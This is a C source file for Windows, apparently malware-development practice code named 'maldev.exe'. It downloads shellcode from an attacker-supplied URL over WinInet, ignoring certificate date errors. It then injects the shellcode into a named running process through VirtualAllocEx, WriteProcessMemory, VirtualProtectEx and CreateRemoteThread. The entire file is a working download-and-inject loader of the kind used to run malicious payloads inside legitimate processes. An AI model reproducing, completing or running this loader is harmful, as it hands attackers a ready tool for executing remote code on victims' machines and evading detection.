#include <Windows.h>
#include <stdio.h>
#include <Tlhelp32.h>
#include <WinInet.h>
#pragma comment(lib, "Wininet.lib")

BOOL GetRemoteProcessHandle(IN LPWSTR szProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess) {

	HANDLE hSnapShot = NULL;

	// Create a snapshot of all processes in the system
	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	PROCESSENTRY32	Proc = {
	.dwSize = sizeof(PROCESSENTRY32)
	};

	if (hSnapShot == INVALID_HANDLE_VALUE) {
		printf("[!] CreateToolhelp32Snapshot Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	printf("created a snapshot using CreateToolhelp32Snapshot\n");

	// Iterate through the snapshot to find the process with the specified name
	while (Process32Next(hSnapShot, &Proc)) {
		if (wcscmp(Proc.szExeFile, szProcessName) == 0) {

			printf("Process \"%ls\" found with PID: %d \n", szProcessName, Proc.th32ProcessID);

			*dwProcessId = Proc.th32ProcessID;
			*hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID);

			if (*hProcess == NULL) {
				printf("OpenProcess Failed With Error : %d \n", GetLastError());
				CloseHandle(hSnapShot);
				return FALSE;
			}
			CloseHandle(hSnapShot);
			return TRUE; // Process found and handle obtained
		}
	}
	CloseHandle(hSnapShot); // Clean up the snapshot handle
	printf("Process \"%ls\" not found.\n", szProcessName);
	return FALSE; // Process not found
}


BOOL InjectShellcodeToRemoteProcess(IN HANDLE hProcess, PBYTE pShellcode, SIZE_T sSizeofShellcode) {

	DWORD	dwOldProtection = NULL;
	PVOID	pShellcodeAddress = NULL;
	SIZE_T	sNumberOfBytesWritten = NULL;

	pShellcodeAddress = VirtualAllocEx(hProcess, NULL, sSizeofShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pShellcodeAddress == NULL) {
		printf("VirtualAllocEx Failed With Error : %d \n", GetLastError());
	}



	printf("pAddress Allocated At : 0x%p using VirtualAllocEx Of Size : %d with RW permissions\n", pShellcodeAddress, sSizeofShellcode);
	printf("Press <Enter> To Write ... ");
	getchar();





	if (!WriteProcessMemory(hProcess, pShellcodeAddress, pShellcode, sSizeofShellcode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeofShellcode) {
		printf("WriteProcessMemory Failed With Error : %d \n", GetLastError());
	}


	if (!VirtualProtectEx(hProcess, pShellcodeAddress, sSizeofShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("[!] VirtualProtectEx Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	printf("Successfully written %d bytes, Press <Enter>\n", sNumberOfBytesWritten);
	getchar();



	printf("Executing the shellcode in the remote process using CreateRemoteThread");
	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pShellcodeAddress, NULL, 0, NULL);	if (hThread == NULL) {
		printf("CreateRemoteThread Failed With Error : %d \n", GetLastError());
	}
	printf("Thread ID: %lu", GetThreadId(hThread));
	printf("DONE !\n");
	if (hThread) {
		CloseHandle(hThread);
	}

}

/*
InternetOpenW - Opens an internet session handle which is a prerequisite to using the other Internet Windows APIs

InternetOpenUrlW - Open a handle to the specified resource which is the payload's URL.

InternetReadFile - Reads data from the web resource handle.This is the handle opened by InternetOpenUrlW.

InternetCloseHandle - Closes the handle.

*/

BOOL GetPayloadFromUrl(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize) {

	BOOL		bSTATE = TRUE;

	HINTERNET	hInternet = NULL,
	hInternetFile = NULL;

	DWORD		dwBytesRead = NULL;

	SIZE_T		sSize = NULL;
	PBYTE		pBytes = NULL,
	pTmpBytes = NULL;



	hInternet = InternetOpenW(NULL, NULL, NULL, NULL, NULL);
	if (hInternet == NULL) {
		printf("InternetOpenW Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}


	hInternetFile = InternetOpenUrlW(hInternet, szUrl, NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
	if (hInternetFile == NULL) {
		printf("InternetOpenUrlW Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}


	pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);
	if (pTmpBytes == NULL) {
		bSTATE = FALSE; goto _EndOfFunction;
	}

	while (TRUE) {

		if (!InternetReadFile(hInternetFile, pTmpBytes, 1024, &dwBytesRead)) {
			printf("InternetReadFile Failed With Error : %d \n", GetLastError());
			bSTATE = FALSE; goto _EndOfFunction;
		}

		sSize += dwBytesRead;

		if (pBytes == NULL)
			pBytes = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
		else
			pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);

		if (pBytes == NULL) {
			bSTATE = FALSE; goto _EndOfFunction;
		}

		memcpy((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);
		memset(pTmpBytes, '\0', dwBytesRead);

		if (dwBytesRead < 1024) {
			break;
		}
	}



	*pPayloadBytes = pBytes;
	*sPayloadSize = sSize;

_EndOfFunction:
	if (hInternet)
		InternetCloseHandle(hInternet);
	if (hInternetFile)
		InternetCloseHandle(hInternetFile);
	if (hInternet)
		InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
	if (pTmpBytes)
		LocalFree(pTmpBytes);
	return bSTATE;
}








int wmain(int argc, wchar_t* argv[]) { // Utilisation de wchar_t 
	if (argc < 3) {
		printf("Usage: maldev.exe <URL> <TargetProcessName>\n");
		return -1;
	}
	printf("Injecting the shellcode fethed from %ls to the remote process \"%ls\"\n", argv[1], argv[2]);

	HANDLE hProcess = NULL;
	DWORD dwProcessId = 0;

	PBYTE pPayloadBytes = NULL;
	SIZE_T sPayloadSize = 0;

	// get the remote handle of the target process
	if (!GetRemoteProcessHandle(argv[2], &dwProcessId, &hProcess)) {
		printf("Failed to get remote process handle.\n");
		return -1;
	}


	if (!GetPayloadFromUrl(argv[1], &pPayloadBytes, &sPayloadSize )) {
		printf("Failed to get the payload from the URL.\n");
		CloseHandle(hProcess);
		return -1;
	}
	printf("Successfully retrieved the payload from the URL, size: %d bytes\n", sPayloadSize);


	// inject the shellcode to the remote process using CreateRemoteThread
	if (!InjectShellcodeToRemoteProcess(hProcess, pPayloadBytes, sPayloadSize)) {
		CloseHandle(hProcess);
		return -1;
	}

	VirtualFreeEx(hProcess, NULL, 0, MEM_RELEASE);

	printf("Done! Press <Enter> to quit");
	getchar();

	CloseHandle(hProcess);
	return 0;
}

